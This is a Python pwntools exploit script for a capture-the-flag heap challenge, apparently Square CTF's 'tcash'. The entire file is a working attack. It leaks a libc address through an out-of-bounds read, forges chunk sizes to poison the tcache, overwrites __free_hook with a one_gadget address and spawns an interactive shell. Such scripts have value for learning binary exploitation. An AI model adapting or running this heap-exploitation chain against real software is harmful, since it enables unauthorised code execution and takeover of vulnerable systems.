import sys
import struct
from pwn import *

# proc = remote("tcash-a57a558adff75b59.squarectf.com", 7852)
proc = process(["./tcash"])

def pause():
    print("PAUSE")
    sys.stdin.read(1)

def menu():
    proc.recvuntil('> ')

def malloc(slot, size):
    proc.sendline('1')
    proc.recvuntil('(0-9)?')
    proc.sendline(str(slot))
    proc.recvuntil('size:')
    proc.sendline(str(size))
    menu()

def write(slot, content):
    proc.sendline('2')
    proc.recvuntil('(0-9)?')
    proc.sendline(str(slot))

    proc.recvuntil('data:')
    proc.sendline(content)
    menu()

def read(slot):
    proc.sendline('3')
    proc.recvuntil('(0-9)?')
    proc.sendline(str(slot))

    content = proc.recvuntil(b'1) malloc')
    menu()
    return content[1:-9]

def free(slot, show_menu=True):
    proc.sendline('4')
    proc.recvuntil('(0-9)?')
    proc.sendline(str(slot))
    if show_menu is True:
        menu()

def secret_chunks(data1, data2):
    proc.sendline('1337')
    proc.recvuntil('(0-9)?')
    proc.sendline('0')
    proc.recvuntil('data 1:')
    proc.sendline(data1)
    proc.recvuntil('data 2:')
    proc.sendline(data2)
    menu()


menu()

small = 0x308
large = 0x6f0

# malloc the first block whith size 0 which will be used to expose / write memory
print("Malloc 0")
malloc(0, 0)

"""
# use this code to leak heap address:
for i in range(8):
    malloc(i+1, 0x100)

for i in [7, 1, 6, 2, 5, 4]:
    free(i)
content = read(0)
libc_leak = content[0x700:0x708]
heap_leak = content[0x708:0x710]
"""

for i in range(5):
    malloc(i+1, 0x100)

# free the first block to leak libc
free(1)

content = read(0)
libc_leak = content[0x700:0x708]

# calculate the libc base address
libc_base = struct.unpack('<Q', libc_leak)[0] - 0x3ebca0
#top_chunk = struct.unpack('<Q', heap_leak)[0] - 0x14f0

print("libc @ ", hex(libc_base))
#print("top chunk @ ", hex(top_chunk))

# manipulate the size of two chunks to fit into the tcache
size = struct.pack('<Q', small + 8 | 1);
base = 2*(large + 8) + 8
content = content[:base] + size + content[base+8:]
base = 4*(large + 8) + 24
content = content[:base] + size + content[base+8:]

print("Overwrite size")
write(0, content)

# free them. They will now be in the tcache
free(2)
free(4)

# calculate the address of the free hook.
# note that we add some padding because of the malloc block alignment constraint
free_hook = libc_base + 0x3ed8d0 # 0x3ed8e8

print("free_hook @", hex(free_hook))

# set target pointer into the second free chunk
content = read(0)
base = 4*(large + 8) + 32
content = content[:base] + struct.pack('<Q', free_hook) + content[base+8:]
write(0, content)

# two gadgets found using one_gadget
# the first one does not work :(
gadget = libc_base + 0x4f2c5
gadget = libc_base + 0x4f322

print("gadget @", hex(gadget))

# allocate the two tcache chunks and write gadget
secret_chunks(b'JUNK', b'\x00' * 24 + struct.pack('<Q', gadget))

# spawn shell
free(0, show_menu=False)

proc.interactive()

